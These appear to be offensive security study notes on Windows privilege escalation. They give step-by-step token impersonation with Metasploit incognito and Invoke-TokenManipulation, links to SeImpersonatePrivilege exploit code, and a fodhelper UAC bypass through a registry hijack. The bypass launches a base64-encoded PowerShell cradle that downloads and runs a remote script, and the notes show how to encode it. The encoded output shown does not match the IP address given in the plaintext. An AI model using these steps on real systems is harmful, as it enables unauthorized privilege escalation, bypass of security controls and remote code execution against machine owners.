**IMPERSONATION:**

If you want to leverage the "SeImpersonatePrivilege", please refer to this [script](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/Windows%20Credentials/PrintSpooferNet.cs), which is used in conjuction with [SpoolSample](https://github.com/leechristensen/SpoolSample).

However if you want to impersonate already logged in users, you can use [incognito](https://www.offsec.com/metasploit-unleashed/fun-incognito/)(through a meterpreter session) or this [powershell script](https://github.com/clymb3r/PowerShell/tree/master/Invoke-TokenManipulation).

**IMPORTANT NOTE TO TAKE IN MIND WHEN IMPERSONATING LOGONS:**  

What does matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for 
the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc).

There are two types of tokens: delegate and impersonate. Delegate tokens are created for ‘interactive’ logons, such as logging into the machine or connecting to it via Remote Desktop. Impersonate tokens are for ‘non-interactive’ sessions, such as attaching a network drive or a domain logon script.
The other great things about tokens? They persist until a reboot. When a user logs off, their delegate token is reported as an impersonate token, but will still hold all of the rights of a delegate token.

TIP: File servers are virtual treasure troves of tokens since most file servers are used as network attached drives via domain logon scripts

(credit to Offsec and clymb3r for this awsome theory explanation).

**Incognito usage:**

Review this link: https://www.offsec.com/metasploit-unleashed/fun-incognito/

But in a nutshell these are the steps to take:

```
1st Migrate to a procces owned by the user we want to impersonate
2nd load incognito
3rd list_tokens -u
4th impersonate_token DEV\\trike   -> for example
5th shell or execute -f cmd.exe -i -t
```

**Invoke-TokenManipulation usage:**

Review its manual specified as comments at the first lines of the script, and this [link](https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/) that contains an overview on tokens and Windows authentication, An overview of what the script does, and problems/solutions encountered when building it and a demonstration of the script.

**UAC BYPASS IMPROVEMENT:**

From powershell throw this commands:

```
1. New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -enc SQBFAFg...” -Force
2. New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyTypeString -Force
3. Execute fodhelper.exe -> if you are in a x86 process: c:\windows\sysnative\cmd.exe /c c:\windows\system32\fodhelper.exe
						             -> if you are in a x64 process: c:\windows\system32\fodhelper.exe
						
The base64 powershell encoded string was -> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')

Encoding a base64 powershell command from linux:

~# pwsh
❯ pwsh
PowerShell 7.2.1
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

   A new PowerShell stable release is available: v7.3.4 
   Upgrade now, or check out the release page at:       
     https://aka.ms/PowerShell-Release?tag=v7.3.4       

Welcome to Parrot OS 

┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')"
┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)                                   ┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $EncodedText = [Convert]::ToBase64String($bytes)                                           ┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $EncodedText                                                                              SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADUALwBhAG0AcwBpAC4AdAB4AHQAJwApAA==
┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ 
```

Additionally to this techniques I would recomend you to use the [WinPeas](https://github.com/carlospolop/PEASS-ng/) script in order to enumerate other posible privilege escalation avenues.
